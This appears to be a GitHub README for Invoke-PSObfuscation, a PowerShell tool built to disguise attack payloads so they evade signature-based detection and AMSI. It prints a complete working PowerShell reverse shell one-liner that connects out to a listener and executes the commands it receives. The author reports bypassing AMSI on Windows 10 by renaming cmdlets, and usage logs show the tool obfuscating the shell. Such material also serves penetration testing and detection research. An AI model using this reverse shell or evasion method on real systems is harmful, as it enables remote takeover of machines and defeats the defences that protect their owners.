# Invoke-PSObfuscation

Where some of the common obfuscation techniques tend to add layers to encapsulate standing code, such as base64 or compression, they tend to leave the intended payload intact, which essentially introduces chokepoints. This no longer worked for me when I needed to use this, so I decided to overhaul my original implementation of Invoke-PSObfuscation. 

This new version focuses on replacing individual components of code with alternative variations while achieving the same intended logic without encapsulating the entire payload within a single layer. More importantly, this is a PowerShell based solution that was built for and be run entirely within Kali Linux. 

I wrote a blog piece for Offensive Security as a precursor into the techniques this tool introduces. Before venturing further, consider giving it a read first:
https://www.offensive-security.com/offsec/powershell-obfuscation/

## Background

PowerShell obfuscation is a topic I have always been passionate about which has largely been due to my love of brain teasers. Throughout the years, I've relied on different types of layering techniques, but I'm starting to find that they're becoming less reliable. As a pre

Therefore, I started my research into different ways I could obfuscate my payloads beyond what I typically would use. To branch away from the layering techniques I relied on, I started to target individual components and all the different ways I could think of to change how they're represented. More importantly, I wanted a way that would allow me to easily target specific components so I could determine how much or how little obfuscation I needed to bypass security checks, such as AMSI.

For example, as of writing this, I was able to bypass AMSI on the latest version of Windows 10 using the vanilla reverse shell just by obfuscating the cmdlet names, while leaving everything else intact. The same can be done just be changing how the namespace class names are represented as well. Although I prefer to obscure my entire payload, it was interesting to learn how little effort it took.

To help explain how this approach works, I have broken it down into components and generators.

## Components

Like many other programming languages, PowerShell can be broken down into many different components that make up the executable logic. This allows us to defeat signature-based detections with relative ease by changing how we represent individual components within a payload to a form an obscure or unintelligible derivative. 

**Supported Types**

* Aliases (iex)
* Cmdlets (New-Object)
* Integers (4444)
* Methods ($client.GetStream())
* Namespace Classes (System.Net.Sockets.TCPClient)
* Pipes (|)
* Pipeline Variables ($_)
* Socket IP / Port Declaration (New-Object System.Net.Sockets.TCPClient("10.10.10.10",80))
* Strings ("value" | 'value')
* Variables ($client)

## Generators

Each component has its own dedicated generator that contains a list of possible static or dynamically generated values that are randomly selected during each execution. If there are multiple instances of a component, then it will iterative each of them individually with a generator. This adds a degree of randomness each time you run this tool against a given payload so each iteration will be different. The only exception to this is variable names.

If an algorithm related to a specific component starts to cause a payload to flag, the current design allows us to easily modify the logic for that generator without compromising the entire script.

```powershell
$Picker = 1..6 | Get-Random
Switch ($Picker) {
    1 { $NewValue = 'Stay' }
    2 { $NewValue = 'Off' }
    3 { $NewValue = 'Ronins' }
    4 { $NewValue = 'Lawn' }
    5 { $NewValue = 'And' }
    6 { $NewValue = 'Rocks' }
}
```

## Requirements

This framework and resulting payloads have been tested on the following operating system and PowerShell versions. 

| PS Version | OS Tested | Invoke-PSObfucation.ps1 | Reverse Shell
| -------------- | :--------- | :--------- | :--------- |
| 7.1.3 | Kali 2021.2 | Supported | Supported
| 5.1.19041.1023 | Windows 10 10.0.19042 | Supported | Supported
| 5.1.21996.1 | Windows 11 10.0.21996 | Supported | Supported

The resulting reverse shells will not work on PowerShell v2.0. _Woah, where's the love for the older versions of PowerShell?_ Initially, my intention was to design this for the newer version of PowerShell. Depending on how well this tool is received, I am planning on making PowerShell v2.0 derivative of this tool called `Invoke-PS2Obfuscation`. 

## Supported Payloads

When I was building out this tool, I was focusing on the reverse shell payload below, which is also how I tested out the compatibility of the generators. However, I am building an upgraded version of this tool to support more advanced payloads, such as the PowerShell exploit for CVE-2021-34527.

### Reverse Shell One-Liner

```powershell
$client = New-Object System.Net.Sockets.TCPClient("10.10.10.10",80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

### Known Issues

09/03/2021 - If you are trying to obfuscate an advanced payload that uses advanced functions with custom parameters and you call that function within the same script, it will replace the parameter declaration variable but will not update the named parameter. This is corrected in the next release.

## Obfuscated One-Liner

![Alt text](./screenshots/0bFu5c4t3d.jpg "0bFu5c4t3d")

## Order of Operations

This solution follows a very simple order of operations. Granted this might be an intimidating script to read through, the main function, Invoke-PSObfuscation, lays out how everything flows togethers.

To help piece this together:

1. The given payload is loaded and flattened (string arrays do not play well with regex replacements so this loads the payload as a regular string object)
2. A regex search looks for occurrences of the targeted component and replaces each instance with a beacon value
3. Each beacon is replaced with a new value created from its dedicated generator function
4. Components will be targeted in the below order whether they are named explicitly or when the `-all` parameter is used.
	* Aliases > Strings > Namespace Classes > Cmdlets > Pipes > Pipeline Variables > Variables > Methods > Integers > Socket Listener
   
_Note: Some functions may double dip with other values. Although, this isn't necessarily a bad thing._

## Usage

```shell
┌──(tristram㉿kali)-[~/Obfuscation]
└─$ pwsh
PowerShell 7.1.3
Copyright (c) Microsoft Corporation.

https://aka.ms/powershell
Type 'help' to get help.

PS /home/tristram/Obfuscation> . ./Invoke-PSObfuscation.ps1
PS /home/tristram/Obfuscation> Invoke-PSObfuscation -Path ./payload.ps1 -IPAddress 127.0.0.1 -Port 4444 -All

     >> Layer 0 Obfuscation
     >> https://github.com/gh0x0st

[*] Converting into a single line
[*] Inserting socket beacons
[*] Resolving aliases
[*] Obfuscating strings
[*] Obfuscating namespace classes
[*] Obfuscating cmdlets
[*] Obfuscating pipes
[*] Obfuscating pipeline variables
[*] Obfuscating variables
[*] Obfuscating method invocations
[*] Obfuscating integers
[*] Obfuscating socket listener ip and port number
[*] Writing payload to /home/tristram/Obfuscation/obfuscated.ps1
[*] Done

PS /home/tristram/Obfuscation> 
```

## Show Changes

One of my personal goals was to try to make it as easy I could for folks to identify how each flagged component was changed and the generator logic involved. To accomplish this, I added the `-ShowChanges` switch. This will instruct the script to output the specific generator number, the original value, and its obfuscated value to the screen. This way if you wanted to look at how it was built you could find it more easily within the main script itself.

```shell
┌──(tristram㉿kali)-[~/Obfuscation]
└─$ pwsh 
PowerShell 7.1.3
Copyright (c) Microsoft Corporation.

https://aka.ms/powershell
Type 'help' to get help.

PS /home/tristram/Obfuscation> . ./Invoke-PSObfuscation.ps1                                                                            
PS /home/tristram/Obfuscation> Invoke-PSObfuscation -Path ./payload.ps1 -IPAddress 127.0.0.1 -Port 4444 -PipelineVariables -ShowChanges

     >> Layer 0 Obfuscation
     >> https://github.com/gh0x0st

[*] Converting into a single line
[*] Inserting socket beacons
[*] Obfuscating pipeline variables
    Generator 1 >> $_ >> <##>$_
    Generator 7 >> $_ >> <#09tkl2Qd1oCTfZvIigs#>$_
[*] Restoring socket listener ip and port number without obfuscation
[*] Writing payload to /home/tristram/Obfuscation/obfuscated.ps1
[*] Done
```

## Comment-Based Help
 
```powershell
<#
    .SYNOPSIS
        Transforms PowerShell scripts into something obscure, unclear, or unintelligible.
	
    .DESCRIPTION
    	Where most obfuscation tools tend to add layers to encapsulate standing code, such as base64 or compression, 
        they tend to leave the intended payload intact, which essentially introduces chokepoints. Invoke-PSObfuscation 
        focuses on replacing the existing components of your code, or layer 0, with alternative values. 
	
    .PARAMETER Path
	A user provided PowerShell payload via a flat file.
	
    .PARAMETER IPAddress
	The user provided IP address for the reverse shell listener.

    .PARAMETER Port
	The user provided port for the reverse shell listener.
	
    .PARAMETER All
        The all switch is used to instruct the function to obfuscate each supported component.
        
    .PARAMETER Aliases
        The aliases switch is used to instruct the function to obfuscate aliases.

    .PARAMETER Cmdlets
        The cmdlets switch is used to instruct the function to obfuscate cmdlets.

    .PARAMETER Listener
        The listener switch is used to instruct the function to obfuscate the listener ip and port.

    .PARAMETER Methods
        The methods switch is used to instruct the function to obfuscate method invocations.

    .PARAMETER NamespaceClasses
        The namespaceclasses switch is used to instruct the function to obfuscate namespace classes.
    
    .PARAMETER Pipes
        The pipes switch is used to instruct the function to obfuscate pipes.

    .PARAMETER PipelineVariables
        The pipeline variables switch is used to instruct the function to obfuscate pipeline variables.

    .PARAMETER ShowChanges
        The ShowChanges switch is used to instruct the script to display the raw and obfuscated values on the screen.

    .PARAMETER Strings
        The strings switch is used to instruct the function to obfuscate prompt strings.
  
    .PARAMETER Variables
        The variables switch is used to instruct the function to obfuscate variables.

    .EXAMPLE
	PS C:\> Invoke-PSObfuscation -Path .\payload.ps1 -IPAddress '192.168.54.197' -Port '443' -All
    
    .EXAMPLE
        PS C:\> Invoke-PSObfuscation -Path .\payload.ps1 -IPAddress '192.168.54.197' -Port '443' -Variables -Cmdlets -OutFile newfile.ps1
	
    .OUTPUTS
	System.String, System.String
	
    .NOTES
	Additional information about the function.
#>
```
